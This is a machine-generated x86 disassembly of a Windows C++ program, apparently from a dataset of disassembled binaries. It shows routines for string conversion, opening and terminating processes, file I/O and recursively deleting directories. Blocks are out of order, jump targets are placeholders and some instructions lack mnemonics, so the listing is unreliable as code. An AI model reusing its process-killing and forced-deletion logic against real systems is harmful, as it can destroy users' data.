add esp 0xc
push eax
lea eax [ ebp - 0x60 ]
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@0@Z
add esp 0xc
push eax
push [ ebp + 0x8 ]
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@ABV10@D@Z
add esp 0xc
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x70 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x34 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov [ ebp - 0x8 ] ebx
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0xc444 ]
push 0xc350
push eax
push [ ebp - 0xc ]
call [ ReadFile@IAT ]
jmp r-xdata
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
cmp [ ebp - 0x3 ] bl
jne r-xdata
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0xb0 ]
push eax
lea eax [ ebp - 0xc444 ]
push [ ebp - 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push eax
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0xb0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov [ ebp - 0x3 ] 0x1
jmp r-xdata
cmp [ ebp - 0x8 ] ebx
jbe r-xdata
cmp [ ebp - 0x8 ] ebx
ja r-xdata
mov edi r--data
push ebx
push edi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
cmp [ ebp - 0x2 ] bl
je r-xdata
push [ ecx ]
lea ecx [ ebp + 0xc ]
push ebx
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
inc eax
lea ecx [ ebp + 0xc ]
inc eax
push eax
lea eax [ ebp - 0xa0 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0xa0 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
push 0x22
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
je r-xdata
push 0xffffffff
push [ ebp - 0x50 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x4c ]
mov esi [ CloseHandle@IAT ]
call esi
push [ ebp - 0x50 ]
call esi
jmp r-xdata
push ebx
push [ ebp - 0x50 ]
call [ TerminateProcess@IAT ]
xor edi edi
push ebx
lea edi [ eax + 0x1 ]
lea ecx [ ebp - 0x1c ]
push edi
push 0x22
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
dec eax
lea ecx [ ebp - 0x1c ]
dec eax
push eax
lea eax [ ebp - 0x90 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x90 ]
jmp r-xdata
push [ ebp - 0xc ]
call esi
push [ ebp - 0x20 ]
call esi
cmp [ ebp - 0x2 ] 0x1
pop edi
pop esi
pop ebx
jne r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
lea ecx [ ebp - 0x1c ]
push [ eax ]
lea eax [ ebp - 0x70 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x70 ]
inc edi
cmp al al
jne r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1c ]
push r--data
push eax
call [ std::operator==@IAT ]
pop ecx
pop ecx
test al al
mov ecx esi
je r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp eax 0x3
lea eax [ ebp - 0x1c ]
push eax
jbe r-xdata
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp eax 0x3
jbe r-xdata
push edi
jmp r-xdata
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea eax [ ebp - 0x60 ]
push 0x5c
push eax
call ??Hstd@@YA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@0@DABV10@@Z
add esp 0xc
mov ecx esi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
lea ecx [ ebp - 0x60 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
jmp r-xdata
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
mov ecx esi
push [ eax ]
push 0x5c
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::rfind@IAT ]
push eax
lea eax [ ebp - 0x80 ]
push ebx
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x80 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
push ebx
push 0x5c
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov ecx [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp eax [ ecx ]
jne r-xdata
lea ecx [ ebp - 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov al [ eax ]
cmp al 0x20
jne r-xdata
push 0x5c
mov ecx esi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator-=@IAT ]
jmp r-xdata
sub_410e0b
push ebp
mov ebp esp
push ebx
push esi
push [ ebp + 0x8 ]
xor ebx ebx
push ebx
push 0x1
call [ OpenProcess@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
mov al bl
pop esi
pop ebx
pop ebp
retn
push ebx
push esi
call [ TerminateProcess@IAT ]
test eax eax
push esi
setne bl
call [ CloseHandle@IAT ]
sub_410e3e
push ebp
mov ebp esp
push esi
mov esi [ GetCurrentProcess@IAT ]
push 0x2
push 0x1
push 0x0
push [ ebp + 0x8 ]
call esi
push eax
call [ GetCurrentThread@IAT ]
push eax
call esi
push eax
call [ DuplicateHandle@IAT ]
pop esi
pop ebp
retn
sub_410e67
push ebp
mov ebp esp
sub esp 0x24
and [ ebp - 0x24 ] 0x0
push edi
push 0x8
xor eax eax
pop ecx
lea edi [ ebp - 0x23 ]
[ edi ]
lea eax [ ebp - 0x24 ]
push 0xa
push eax
push [ ebp + 0xc ]
call [ _itoa@IAT ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x24 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
sub_410ea5
push ebp
mov ebp esp
sub esp 0x44
and [ ebp - 0x44 ] 0x0
push edi
push 0x10
xor eax eax
pop ecx
lea edi [ ebp - 0x42 ]
[ edi ]
lea eax [ ebp - 0x44 ]
push 0xa
push eax
push [ ebp + 0xc ]
call [ _itow@IAT ]
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x44 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
leave
retn
sub_410ee4
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x1 ]
push eax
push 0x20
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::end@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
push eax
call sub_411f0b
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_410f44
push ebp
mov ebp esp
sub esp 0x14
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x1 ]
push eax
push 0x20
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::begin@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::end@IAT ]
mov ecx [ ebp + 0xc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::begin@IAT ]
push eax
call sub_411f2c
mov ecx [ ebp + 0x8 ]
add esp 0xc
lea eax [ ebp - 0x14 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_410fa4
push ebp
mov ebp esp
push ecx
mov ecx [ ebp + 0xc ]
lea eax [ ebp - 0x1 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
mov ecx [ ebp + 0xc ]
shl eax 0x1
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::c_str@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_410fd0
push ebp
mov ebp esp
sub esp 0x10
mov ecx [ ebp + 0xc ]
push ebx
push esi
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
mov esi eax
inc esi
inc esi
lea eax [ esi + esi ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov ebx eax
mov ecx esi
xor eax eax
mov edx ecx
mov edi ebx
shr ecx 0x2
[ edi ]
mov ecx edx
and ecx 0x3
[ edi ]
mov ecx [ ebp + 0xc ]
lea edi [ esi - 0x2 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
mov esi eax
mov eax edi
mov edi ebx
mov ecx eax
shr ecx 0x2
[ edi ] [ esi ]
mov ecx eax
lea eax [ ebp + 0xf ]
and ecx 0x3
push eax
[ edi ] [ esi ]
push ebx
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push ebx
call sub_412390
pop ecx
lea eax [ ebp - 0x10 ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
pop ebx
leave
retn
sub_411059
push ebp
mov ebp esp
sub esp 0x10
push esi
push 0x0
push [ ebp + 0x1c ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::find@IAT ]
mov esi eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp esi [ eax ]
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
push [ ebp + 0x20 ]
lea eax [ ebp + 0x1f ]
lea ecx [ ebp - 0x10 ]
push eax
push [ ebp + 0x1c ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov ecx eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::length@IAT ]
push eax
push esi
lea ecx [ ebp + 0xc ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::replace@IAT ]
mov ecx [ ebp + 0x8 ]
push eax
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
jmp r-xdata
lea ecx [ ebp + 0xc ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::~basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
pop esi
leave
retn
sub_4110d0
push ebp
mov ebp esp
sub esp 0x10
push esi
mov esi [ ebp + 0xc ]
lea eax [ ebp + 0xf ]
push edi
push eax
push esi
lea ecx [ ebp - 0x10 ]
xor edi edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
cmp [ esi ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x10 ]
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
push ebx
mov [ ebp + 0xc ] esi
lea ecx [ ebp - 0x10 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
push edi
lea ecx [ ebp - 0x10 ]
mov ebx eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator[]@IAT ]
mov ecx [ ebp + 0xc ]
inc edi
dec [ ebp + 0xc ]
mov cl [ ebx + ecx - 0x1 ]
mov [ eax ] cl
cmp [ edi + esi ] 0x0
jne r-xdata
pop ebx
sub_41113a
push ebp
mov ebp esp
sub esp 0x34
push esi
lea eax [ ebp - 0x1 ]
push edi
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x1 ]
lea ecx [ ebp - 0x24 ]
push eax
call sub_403e50
lea ecx [ ebp + 0xc ]
xor edi edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
test eax eax
jbe r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x24 ]
push eax
call sub_411d16
lea ecx [ ebp - 0x24 ]
call sub_401ad8
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea ecx [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov eax [ ebp + 0x8 ]
pop edi
pop esi
leave
retn
lea eax [ ebp + 0x1c ]
push edi
push eax
lea ecx [ ebp + 0xc ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::find@IAT ]
mov esi eax
mov eax [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::npos@IAT ]
cmp esi [ eax ]
je r-xdata
push [ eax ]
lea eax [ ebp - 0x34 ]
lea ecx [ ebp + 0xc ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
push eax
call sub_411d5e
mov eax esi
lea ecx [ ebp + 0xc ]
sub eax edi
push eax
lea eax [ ebp - 0x34 ]
push edi
push eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::substr@IAT ]
push eax
lea ecx [ ebp - 0x14 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::operator=@IAT ]
lea ecx [ ebp - 0x34 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
lea eax [ ebp - 0x14 ]
lea ecx [ ebp - 0x24 ]
push eax
call sub_411d5e
lea ecx [ ebp + 0x1c ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
add eax esi
lea ecx [ ebp + 0xc ]
mov edi eax
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::length@IAT ]
cmp edi eax
jb r-xdata
jmp r-xdata
sub_41123a
push ebp
mov ebp esp
push ecx
cmp [ rw-data ] 0x0
je r-xdata
xor al al
lea eax [ ebp - 0x4 ]
push eax
call [ GetCurrentProcess@IAT ]
push eax
call [ rw-data ]
push 0x1
pop eax
cmp [ ebp - 0x4 ] eax
je r-xdata
leave
retn
sub_411264
push ebp
mov ebp esp
cmp [ rw-data ] 0x1
jne r-xdata
xor al al
pop ebp
retn
push [ ebp + 0x8 ]
push 0x0
push 0x400
call [ OpenProcess@IAT ]
lea ecx [ ebp + 0x8 ]
push ecx
push eax
call [ rw-data ]
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
mov al 0x1
pop ebp
retn
sub_411299
push ebp
mov ebp esp
sub esp 0x208
push [ ebp + 0xc ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
lea ecx [ ebp - 0x208 ]
push 0x208
push ecx
push 0x0
push eax
call [ rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp + 0xf ]
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_4112ef
push ebp
mov ebp esp
sub esp 0x208
push [ ebp + 0xc ]
push 0x0
push 0x410
call [ OpenProcess@IAT ]
lea ecx [ ebp - 0x208 ]
push 0x208
push ecx
push 0x0
push eax
call [ rw-data ]
test eax eax
jne r-xdata
lea eax [ ebp + 0xf ]
push eax
lea eax [ ebp - 0x208 ]
push eax
lea eax [ ebp + 0xf ]
push eax
push r--data
jmp r-xdata
mov ecx [ ebp + 0x8 ]
call [ std::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >::basic_string<uint16_t,struct std::char_traits<uint16_t>,class std::allocator<uint16_t> >@IAT ]
mov eax [ ebp + 0x8 ]
leave
retn
sub_411345
push ebp
mov ebp esp
push esi
mov esi [ wcscmp@IAT ]
push r--data
push [ ebp + 0x8 ]
call esi
pop ecx
test eax eax
pop ecx
je r-xdata
push 0x1
pop eax
push r--data
push [ ebp + 0x8 ]
call esi
pop ecx
test eax eax
pop ecx
je r-xdata
xor eax eax
jmp r-xdata
pop esi
pop ebp
retn
sub_411379
push ebp
mov ebp esp
sub esp 0x668
push ebx
push esi
mov esi [ wcscpy@IAT ]
push edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x418 ]
push eax
call esi
mov edi [ wcscat@IAT ]
lea eax [ ebp - 0x418 ]
push r--data
push eax
call edi
push [ ebp + 0x8 ]
lea eax [ ebp - 0x210 ]
push eax
call esi
lea eax [ ebp - 0x210 ]
push r--data
push eax
call edi
add esp 0x20
lea eax [ ebp - 0x668 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call [ FindFirstFileW@IAT ]
cmp eax 0xffffffff
mov [ ebp - 0x8 ] eax
je r-xdata
xor eax eax
jmp r-xdata
lea eax [ ebp - 0x210 ]
push eax
lea eax [ ebp - 0x418 ]
push eax
call esi
mov ebx [ RemoveDirectoryW@IAT ]
pop ecx
pop ecx
mov [ ebp - 0x1 ] 0x1
pop edi
pop esi
pop ebx
leave
retn
call [ GetLastError@IAT ]
cmp eax 0x12
jne r-xdata
lea eax [ ebp - 0x63c ]
push eax
call sub_411345
test eax eax
pop ecx
jne r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
and [ ebp - 0x1 ] 0x0
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
lea eax [ ebp - 0x63c ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call edi
test [ ebp - 0x668 ] 0x10
pop ecx
pop ecx
je r-xdata
lea eax [ ebp - 0x668 ]
push eax
push [ ebp - 0x8 ]
call [ FindNextFileW@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x8 ]
call [ FindClose@IAT ]
push [ ebp + 0x8 ]
call ebx
test [ ebp - 0x668 ] 0x1
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call sub_411379
test eax eax
pop ecx
je r-xdata
lea eax [ ebp - 0x210 ]
push eax
call [ DeleteFileW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x210 ]
push 0x80
push eax
call [ SetFileAttributesW@IAT ]
lea eax [ ebp - 0x210 ]
push eax
call ebx
jmp r-xdata
lea eax [ ebp - 0x418 ]
push eax
lea eax [ ebp - 0x210 ]
push eax
call esi
pop ecx
pop ecx
jmp r-xdata
sub_4114e1
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x14 ]
push ebx
xor ebx ebx
push esi
sub eax ebx
je r-xdata
mov [ ebp - 0x8 ] 0x40000000
mov [ ebp - 0x4 ] 0x2
dec eax
jne r-xdata
cmp [ ebp + 0x14 ] 0x1
jne r-xdata
xor al al
jmp r-xdata
push ebx
push 0x80
push [ ebp - 0x4 ]
push ebx
push ebx
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push 0x4
pop eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
lea eax [ ebp + 0x10 ]
push ebx
push eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
call [ WriteFile@IAT ]
test eax eax
je r-xdata
push 0x2
push ebx
push ebx
push esi
call [ SetFilePointer@IAT ]
cmp eax 0xffffffff
je r-xdata
pop esi
pop ebx
leave
retn
push esi
call [ CloseHandle@IAT ]
mov al bl
mov bl 0x1
sub_41156a
push ebp
mov ebp esp
push ebx
xor ebx ebx
push esi
push ebx
push 0x80
push 0x3
push ebx
push 0x3
push 0x80000000
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push ebx
push esi
call [ GetFileSize@IAT ]
mov ecx [ ebp + 0xc ]
mov edi eax
push ebx
push edi
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::resize@IAT ]
mov ecx [ ebp + 0xc ]
lea eax [ ebp + 0x8 ]
push ebx
push eax
push edi
mov [ ebp + 0x8 ] ebx
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
push esi
call [ ReadFile@IAT ]
test eax eax
pop edi
je r-xdata
xor al al
jmp r-xdata
push esi
call [ CloseHandle@IAT ]
mov al bl
mov bl 0x1
pop esi
pop ebx
pop ebp
retn
sub_4115d9
push ebp
mov ebp esp
push ebx
push 0x0
push [ ebp + 0x18 ]
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::size@IAT ]
push eax
lea ecx [ ebp + 0x8 ]
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::c_str@IAT ]
push eax
call sub_4114e1
add esp 0x10
lea ecx [ ebp + 0x8 ]
mov bl al
call [ std::basic_string<char,struct std::char_traits<char>,class std::allocator<char> >::~basic_string<char,struct std::char_traits<char>,class std::allocator<char> >@IAT ]
mov al bl
pop ebx
pop ebp
retn
sub_41160e
push ebp
mov ebp esp
push esi
push edi
xor edi edi
push edi
push 0x80
push 0x3
push edi
push 0x1
push 0x80000000
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push edi
push esi
call [ GetFileSize@IAT ]
push esi
mov edi eax
call [ CloseHandle@IAT ]
mov eax edi
xor eax eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_411650
push ebp
mov ebp esp
sub esp 0x50
push edi
xor edi edi
cmp [ ebp + 0x8 ] edi
je r-xdata
mov eax edi
pop edi
leave
retn
push edi
